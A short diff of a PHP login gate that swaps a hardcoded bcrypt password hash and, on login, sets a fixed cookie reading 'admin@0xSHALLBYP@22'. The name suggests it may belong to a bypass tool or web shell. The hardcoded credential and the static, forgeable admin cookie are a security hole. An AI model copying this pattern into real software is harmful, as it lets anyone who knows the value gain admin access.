@@ -64,7 +64,7 @@ if (is_logged_in()) {
 } else {
     if (isset($_POST['password'])) {
         $entered_key = $_POST['password'];
-        $hashed_key = '$2y$10$gtCTLu4h7veCJ7ojSSh/GeKZOnrshGp4layB6GhrCTAlCbSE6uW3e';
+        $hashed_key = '$2y$12$qYJ2JJEEUsImdFZGKmaO4ebOjIwd966rxMcN7woiFTnJB/iqenzYS';
         
         if (password_verify($entered_key, $hashed_key)) {
             setcookie('user_id', 'admin@0xSHALLBYP@22', time() + 3600, '/'); 
@@ -157,4 +157,5 @@ if (is_logged_in()) {
     <?php
 }
 ?>
+
 
